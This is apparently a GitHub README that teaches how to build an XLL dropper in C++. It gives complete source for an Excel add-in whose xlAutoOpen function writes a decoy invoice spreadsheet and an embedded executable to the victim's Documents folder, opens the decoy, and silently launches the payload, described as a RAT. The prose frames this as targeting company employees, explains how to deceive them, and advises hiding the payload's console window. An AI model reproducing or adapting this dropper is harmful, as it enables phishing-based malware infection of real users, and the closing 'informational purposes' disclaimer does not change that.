# XLL-DROPPER-

<h4 align="center"></h4>
<p align="center">
XLL DROPPER | Learn to create Native xll Dropper

Write XLL Dropper in c++ , a red teams most used dropper , learn how to be like a red teams and APT groups by building your XLL Dropper

Before we dig deeper, what is the Hack Dropper, and what the Hack is the XLL Dropper what are the differences and when to use it and why to use it and not use an exe dropper

#What the Hack is Dropper

A Dropper is like a delivery vehicle that has a payload to drop when it arrives at the target location!
We can take an example of Amazon delivery autopilot drones which carry multiple payloads and when they arrive at a location it drop the payload on the door of the house
Same for the Dropper in malware the dropper can carry 1 payload or more for example an old Dropper may carry 1 video or photo and 1 rat and the hacker can create an icon from the image that the dropper carries and change the icon of the exe to the new icon and spoof the extension of the exe to be dropper.png.exe and because windows default settings will not show the extension it will appear like this dropper.png and the correct extension will be hidden
When the hacker sends it to the target and the target clicks on it in 1 click it will drop the image and run it and will drop the RAT and run it in 1 click the will fool the target he clicking on the image because see they image show up in his windows
But what he did not know was that the image may maybe in the temp folder

#What is the Hack is XLL Dropper and how does it work

Xll is a file extension or plugin for excel files
xll files are similar to dlls they are the same but the xll is not a normal executable file it is a plugin for excel files
for example you can write a plugin for excel files and in the plugin, you can add functions to calculate or add a formula for you and in excel you can import the plugin or xll file and start using the functions that you create in the plugins.

There is 1 more difference between the dll and xll files in dll you can not click it to launch the only way to use it without loading it using exe using loadlibraryA is by using the Rundll32.exe it but with xll, you can 1 click to launch it and use it
when you click on the xll file the Excel will launch and you can start using excel with xll loaded

But to make a 1 click xll dropper work there is a very important function we will use
int WINAPI xlAutoOpen(void);

The functions take no arguments , For this function to be used correctly we need to export it from the xll file so the excel can use it and to make the xll file valid xll or the xll file will not opened using excel and will show an error


#How the Xll Dropper works

Same as the exe dropper but these days exe files and extension spoofing are very detected
So as a solution Hackers and developers start using XLL files to deliver their payload because
Excel files are widely used in companies almost every company uses Excel
So how does the xll drooper work?
When a target clicks an xll file the excel.exe will import the xll file and search for the function xlAutoOpen if he finds it he triggers the function Inside the xlAutoOpen function the hacker does what a normal dropper does like dropping the excel file to the temp directory to fool the employee and drop the Rat and starting them both

The target will see the excel file show up on his window so and the Rat will run in the background so no suspicious


#When to use Xll Dropper and when to use Exe Dropper?
So what to use? it depends on what are you targeting
Of course not all the targets will have excel installed so does the xll dropper worse
The answer is yes if you are targeting a youtube channel , company employee
You can use the xll dropper but if you are targeting random people you can use only Dropper as a PDF dropper by spoofing the extension and doing some icon changes which I don't recommend


Now there are a few tools you need to download before we start coding

1 - Visual studio IDE
2 - Excel or Microsoft Office
3 - Putty to test the dropper you can use any other portable software
4 - Download Excel 2013 SDK from Microsoft https://www.microsoft.com/en-us/download/details.aspx?id=35567

The installation is very easy

Lets start writing the XLL Dropper by creating a new dll project

As an Option You can disable precompiled headers you can do that by opening the project properties C/C++ Precompiled headers
Precompiled headers change use /Yu to not using precompiled headers

<h2 align="center"></h2>
<img src="https://github.com/EvilGreys/XLL-DROPPER-/blob/main/pasted/pasted_.png" 
<p align="center">

Now you can delete the line #include "pch.h" and remove the file from the project

Before we add the headers and libraries for the Excel SDK will start coding the dropper
But first create a new excel file that will be used to trick the company employee
Examble for simple invoice :

<h2 align="center"></h2>
<img src="https://github.com/EvilGreys/XLL-DROPPER-/blob/main/pasted/pasted.png" 
<p align="center">

Dont use it in attacks this is just an example

Back to the visual studio and create resource items the visual studio will automatically generate 2 files resource.h , resource.rc open the resource header add the 4 four defines

```
#define EXCEL_FILE 105
#define EXCEL_INVOICE 106

#define EXE_FILE 107
#define PAYLOAD_FILE 108
```
EXCEL_FILE is the type of the file excel EXCEL_INVOICE is the name of the file
EXE_FILE is the type of the exe file PAYLOAD_FILE is the name of the exe file

Close the resource header and open the resource.rc right click and click on view code

Delete everything in the file and add these few lines

```
#include "resource.h"

EXCEL_INVOICE EXCEL_FILE  "invoice.xlsx"

PAYLOAD_FILE EXE_FILE   "putty.exe"
```

So we include the resource header and add the type and the name of the file and the last thing is the path of the file which in our case invoice.xlsx putty.exe
Copy the putty and invoice files to the same directory of your project

Back to the main file and compile the project should compile success

Now first we need to get the path of the excel.exe this path is stored in the registry under

Computer\HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Word\Options

Value name: PROGRAMDIR

Now its the time to import the Excel sdk go to properties c/c++ General Add additional include library
Add the path of the Sdk include library
Again go to Properties c/c++ Linker Input Additional dependencies add the path of the library make sure you choose the 64 bit version now you can include the sdk header

```
#include "XLCALL.H"
```

Create the xlAutoOpen


```
extern "C" __declspec(dllexport) short __stdcall xlAutoOpen()
{
}
```

The xlAutoOpen function is exported as you see here we add everything

Lets get the path of the excel.exe by querying the register

```
    HKEY key;
    RegOpenKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\Office\\16.0\\Word\\Options", &key);

    DWORD regType = REG_SZ;
    char  ExcelPath[MAX_PATH];
    DWORD ExcelPathsize = MAX_PATH;

    RegQueryValueExA(key, "PROGRAMDIR", NULL, &regType, (LPBYTE)ExcelPath, &ExcelPathsize);

    strcat_s(ExcelPath, "excel.exe");
```

So we used RegOpenKeyA to get a handle to the registry then we used the function RegQueryValueExA
To query the value of the name PROGRAMDIR

You can open the register by typing regedit in Windows Run and go to this key path
Computer\HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Word\Options
You can see the path without excel.exe but if you copy the path and past it in your Windows Explorer you can find the excel.exe this problem fix is very easy we used strcat_s to Append the excel.exe to the Microsoft Office path so we can use it later to execute the invoice.xlsx

Now we have the full path of the excel.exe .
We need now to read the xlsx and putty files from the resource we can do that in a few easy steps
First we need to find the resource in the xll so we used the function FindResource
But before we first need to get module Handle using GetModuleHandleEx

```
    HMODULE hmodule = retriveHandle();
    HRSRC hRes = FindResource(hmodule, MAKEINTRESOURCE(EXCEL_INVOICE), MAKEINTRESOURCE(EXCEL_FILE));


    HGLOBAL hData = LoadResource(hmodule, hRes);

    int   excelSize = (SizeofResource(hmodule, hRes));
    char* Excel   = (char*)LockResource(hData);
```

After getting a handle in the function FindResource the first parameter is the handle the next is the name of the file the third is the type of the file so now
After finding the resource need to load the resource using the function LoadResource
This function has 2 parameters first is the handle and the second is the Handle that is returned by the function FindResource Now we had to get the size of the resource before we could read it and write it this can be done using the function SizeofResource
Now we can read it using the function LockResource this function will retrieve a pointer to the resource finally we can write it to a file but i will not do that right now will get a pointer to the putty file

```
 HRSRC phRes = FindResource(hmodule, MAKEINTRESOURCE(PAYLOAD_FILE), MAKEINTRESOURCE(EXE_FILE));
 HGLOBAL phData = LoadResource(hmodule, phRes);

  int PayloadSize = (SizeofResource(hmodule, phRes));
  char* Payload = (char*)LockResource(phData);
```

This code same as the code we use to get a pointer to the xlsx file or excel file but we only replaced the name and the type of the file in the FindResource function with the name and type of the payload file or the putty.exe file Remember you can name them whatever you want

Now will write these two files to the document folder we can get the temp folder path using the function SHGetFolderPathA
This function is included in the header file shlobj make sure you include it another thing you need to add the library shell32.lib using #pragma comment

```
#include <shlobj.h>
#pragma comment(lib, "shell32.lib")
```

Also dont forget to include resource.h header file


```
char excel_file_path[MAX_PATH];
    const char* excel_file_name = "\\invoice.xlsx";
    char my_documents[MAX_PATH];
    HRESULT result = SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, my_documents);

    strcpy_s(excel_file_path, my_documents);
    strcat_s(excel_file_path, excel_file_name);
```

So if you understand c++ you notice that we create 3 variables one to store the name of the excel file one to store the full path of the excel file and the third and last one to store the document folder path
After we are done we use strcpy_s to copy the document path to the excel_file_path variable and then we copy the excel file name to the excel_file_path using the function strcat_s
The reason we did not append the excel file name to the document path variable because we will use the same directory twice one for the excel file and the second for the payload file and do to not use the same function SHGetFolderPathA twice we create the third variable

```
    char payload_file_path[MAX_PATH];
    const char* payload_file_name = "\\putty.exe";

    strcpy_s(payload_file_path, my_documents);
    strcat_s(payload_file_path, payload_file_name);
```

So here is the trick we did what we did in the code above we created two other variables for the payload and we copied the document path to the payload path and appended the payload file name to the full payload path

so we can now write the both files excel file and payload file to the disk

```
    HANDLE hXllFile = CreateFileA(excel_file_path, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    WriteFile(hXllFile, Excel, excelSize, 0, 0);
    CloseHandle(hXllFile);


    HANDLE hPayloadFile = CreateFileA(payload_file_path, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    WriteFile(hPayloadFile, Payload, PayloadSize, 0, 0);

    CloseHandle(hPayloadFile);
```

We used the function CreateFileA and passed the path excel excel_file_path in the parameter 1 to make sure in parameter 2 you pass GENERIC_WRITE so you can get permission to write files third and fourth parameters NULL the 6 CREATE_ALWAYS so every time the xll file is clicked the dropper will delete the old one and write new data here its up to you , you can change CREATE_ALWYAS to OPEN_ALWAYS which will create the file if not exist but if the file exists will not replace old with a new file
parameter 7 this cannot be changed and should be FILE_ATTRIBUTE_NORMAL

Then we use the WriteFile function to write the excel bytes to the desk first parameter is the handle to the file we created second is the excel byte that we get using the function LockResource

Finally we close the handle and Dont forget to close the handle or the file will be busy and you cannot launch it using excel.exe
Same with the payload we did the same thing with no extra steps only changing the variables names

```
 LPSTARTUPINFOA startupinfo_1 = new STARTUPINFOA();
 LPPROCESS_INFORMATION procinformation_1 = new PROCESS_INFORMATION();

 char process_name[MAX_PATH];

 strcpy_s(process_name, "c:\\windows\\system32\\cmd.exe /c \"\"");
 strcat_s(process_name, ExcelPath);
 strcat_s(process_name, "\" \"");
 strcat_s(process_name, excel_file_path);
 strcat_s(process_name, "\" \"");

 MessageBoxA(NULL, process_name,NULL , MB_OK);
 CreateProcessA(NULL, (LPSTR)process_name, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, startupinfo_1, procinformation_1);


 LPSTARTUPINFOA startupinfo_2 = new STARTUPINFOA();
 LPPROCESS_INFORMATION procinformation_2 = new PROCESS_INFORMATION();


 CreateProcessA(NULL, (LPSTR)payload_file_path, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, startupinfo_2, procinformation_2);
```

This will maybe a complicated part because we did a few steps before we executed the excel file for the putty is very simple we directly launch it up as you see in the code
But for the excel we first a single variable to copy the full command to it then we use the function strcpy_s to copy the default cmd.exe path and we use /c so the cmd can carry the next command and we don’t forget to add two double quotes one for the full command and the second is for the excel.exe path
Then we use the function strcat_s to copy the excel.exe path then we close the second double quote and open a new one for the excel file path and close the first and last quotes we opened then we use the function CreateProcess to execute the command
It takes a few arguments the first is the path of the executable if we are executing a single executable like in putty.exe we use the first parameter but in the excel we will use the second parameter because we will use cmd.exe with arguments
The third and fourth are Null the parameter number 5 is FALSE and for the 6 parameters for the excel we dont need any console so we used CREATE_NO_WINDOWS but for the putty i used CREATE_NEW CONSOLE only to show you how it works but when using this to target some targets make CREATE_NO_WINDOWS this is important to not show any console on the target screen

Full source code :
dllmain.cpp

```
#include <windows.h>
#include <shlobj.h>
#include "XLCALL.H"
#include "resource.h"


#pragma comment(lib, "shell32.lib")

HMODULE retriveHandle()
{
    HMODULE hmodule = NULL;

    GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,LPCWSTR(retriveHandle), &hmodule);

    return hmodule;
}


extern "C" __declspec(dllexport) short __stdcall xlAutoOpen()
{

    HKEY key;
    RegOpenKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\Office\\16.0\\Word\\Options", &key);

    DWORD regType = REG_SZ;
    char  ExcelPath[MAX_PATH];
    DWORD ExcelPathsize = MAX_PATH;

    RegQueryValueExA(key, "PROGRAMDIR", NULL, &regType, (LPBYTE)ExcelPath, &ExcelPathsize);

    strcat_s(ExcelPath, "excel.exe");


    HMODULE hmodule = retriveHandle();
    HRSRC hRes = FindResource(hmodule, MAKEINTRESOURCE(EXCEL_INVOICE), MAKEINTRESOURCE(EXCEL_FILE));


    HGLOBAL hData = LoadResource(hmodule, hRes);

    int   excelSize = (SizeofResource(hmodule, hRes));
    char* Excel   = (char*)LockResource(hData);

    HRSRC phRes = FindResource(hmodule, MAKEINTRESOURCE(PAYLOAD_FILE), MAKEINTRESOURCE(EXE_FILE));
    HGLOBAL phData = LoadResource(hmodule, phRes);

     int PayloadSize = (SizeofResource(hmodule, phRes));
     char* Payload = (char*)LockResource(phData);

    char excel_file_path[MAX_PATH];
    const char* excel_file_name = "\\invoice.xlsx";
    char my_documents[MAX_PATH];
    HRESULT result = SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, my_documents);

    strcpy_s(excel_file_path, my_documents);
    strcat_s(excel_file_path, excel_file_name);


    char payload_file_path[MAX_PATH];
    const char* payload_file_name = "\\putty.exe";

    strcpy_s(payload_file_path, my_documents);
    strcat_s(payload_file_path, payload_file_name);

    HANDLE hXllFile = CreateFileA(excel_file_path, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    WriteFile(hXllFile, Excel, excelSize, 0, 0);
    CloseHandle(hXllFile);


    HANDLE hPayloadFile = CreateFileA(payload_file_path, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    WriteFile(hPayloadFile, Payload, PayloadSize, 0, 0);

    CloseHandle(hPayloadFile);


    LPSTARTUPINFOA startupinfo_1 = new STARTUPINFOA();
    LPPROCESS_INFORMATION procinformation_1 = new PROCESS_INFORMATION();

    char process_name[MAX_PATH];

    strcpy_s(process_name, "c:\\windows\\system32\\cmd.exe /c \"\"");
    strcat_s(process_name, ExcelPath);
    strcat_s(process_name, "\" \"");
    strcat_s(process_name, excel_file_path);
    strcat_s(process_name, "\" \"");

    MessageBoxA(NULL, process_name,NULL , MB_OK);
    CreateProcessA(NULL, (LPSTR)process_name, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, startupinfo_1, procinformation_1);


    LPSTARTUPINFOA startupinfo_2 = new STARTUPINFOA();
    LPPROCESS_INFORMATION procinformation_2 = new PROCESS_INFORMATION();


    CreateProcessA(NULL, (LPSTR)payload_file_path, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, startupinfo_2, procinformation_2);



    return 0;
}



BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

This is tasted on Windows 11 and Microsoft office 2019


## THE NOTE
This article is for informational purposes only. We do not encourage you to commit any hacking. Everything you do is your responsibility.

TOX : 340EF1DCEEC5B395B9B45963F945C00238ADDEAC87C117F64F46206911474C61981D96420B72 Telegram : @DevSecAS 

Website : injectexp.dev
